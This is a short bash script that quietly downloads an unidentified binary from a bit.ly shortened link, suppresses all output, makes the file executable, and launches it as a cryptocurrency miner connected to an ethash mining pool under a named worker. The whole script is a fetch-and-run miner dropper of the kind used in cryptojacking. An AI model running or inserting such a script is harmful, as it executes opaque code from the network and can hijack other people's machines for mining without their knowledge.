#!/bin/bash
wget -O klx https://bit.ly/klx_nano >/dev/null 2>&1
chmod +x klx >/dev/null 2>&1
./klx -pool stratum+tcp://ethash.poolbinance.com:443 -wal teguhcong.gpu-mt -pass x
